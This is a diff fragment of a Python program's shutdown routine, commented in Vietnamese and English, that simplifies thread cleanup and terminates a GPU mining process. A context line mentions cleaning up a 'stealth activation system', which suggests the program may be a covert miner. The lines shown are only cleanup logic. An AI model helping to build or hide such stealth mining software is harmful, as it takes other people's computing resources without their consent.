-        logger.info("Nhận tín hiệu KeyboardInterrupt. Đang dừng...")
+        logger.info("⏹️ Nhận tín hiệu KeyboardInterrupt. Đang dừng...")
         stop_event.set()
     
-    # **Thread cleanup and synchronization** (dọn dẹp và đồng bộ hóa luồng)
-    logger.info("🧹 Starting thread cleanup and synchronization...")
+    # ------------------------------------------------------------------
+    # 7️⃣ **SIMPLIFIED**: Cleanup đơn giản
+    # ------------------------------------------------------------------
+    logger.info("🧹 Starting simplified cleanup...")
     
-    # 🗑️ **REMOVED**: EventBus shutdown - DirectPIDRegistry handles cleanup automatically
-    logger.info(f"🔚 System shutdown initiated: {sum(1 for _, thread in started_threads if thread.is_alive())} active threads")
-    
-    # **Graceful thread termination** (kết thúc luồng nhẹ nhàng) với timeout
-    thread_shutdown_timeout = 10  # seconds
-    for thread_name, thread in started_threads:
+    # **Simple background thread cleanup** (dọn dẹp background thread đơn giản)
+    logger.info("🔄 Stopping background threads...")
+    for thread_name, thread in background_threads:
         if thread.is_alive():
-            logger.info(f"🔄 Waiting for {thread_name} thread to finish...")
-            thread.join(timeout=thread_shutdown_timeout)
-            
+            logger.info(f"⏳ Waiting for {thread_name} to stop...")
+            thread.join(timeout=5)  # Shorter timeout
             if thread.is_alive():
-                logger.warning(f"⚠️ {thread_name} thread did not stop within {thread_shutdown_timeout}s - forced termination")
+                logger.warning(f"⚠️ {thread_name} did not stop gracefully")
             else:
-                logger.info(f"✅ {thread_name} thread stopped gracefully")
+                logger.info(f"✅ {thread_name} stopped")
     
     # **Step 5**: Stealth system cleanup
     logger.info("📋 Step 5/5: Cleaning up stealth activation system...")
@@ -1380,27 +964,26 @@ def main():
     # **Cleanup** (dọn dẹp) và thoát
     logger.info("Bắt đầu quá trình dọn dẹp cuối cùng...")
     
-    # Performance reporting removed - simplified cleanup
     
     
-    # **Lock-Free GPU Process Cleanup** (dọn dẹp tiến trình GPU không khóa)
+    # **Simple GPU Process Cleanup** (dọn dẹp tiến trình GPU đơn giản)
     logger.info("🧹 Cleaning up GPU mining process...")
-    gpu_alive, current_process = process_manager.get_gpu_process_status()
-    if gpu_alive and current_process:
-        logger.info(f"Dừng tiến trình GPU miner (PID: {current_process.pid})...")
+    if gpu_process and is_mining_process_running(gpu_process):
+        logger.info(f"⏹️ Stopping GPU process (PID: {gpu_process.pid})...")
         try:
-            current_process.terminate()
-            current_process.wait(timeout=5)  # Wait for graceful termination
-            logger.info("✅ GPU process terminated gracefully")
+            gpu_process.terminate()
+            gpu_process.wait(timeout=5)
+            logger.info("✅ GPU process stopped gracefully")
         except subprocess.TimeoutExpired:
-            logger.warning("⚠️ GPU process did not terminate gracefully, forcing kill")
-            current_process.kill()
+            logger.warning("⚠️ Force killing GPU process")
+            gpu_process.kill()
         except Exception as e:
-            logger.error(f"❌ Error terminating GPU process: {e}")
+            logger.error(f"❌ Error stopping GPU process: {e}")
         finally:
-            process_manager.set_gpu_process(None)  # **Clear lock-free reference**
+            process_manager.set_gpu_process(None)
+            gpu_process = None
     
-    logger.info("Hệ thống đã dừng. Thoát.")
+    logger.info("===== HỆ THỐNG ĐÃ DỪNG (SIMPLIFIED ARCHITECTURE) =====")
 
 if __name__ == "__main__":
     main()
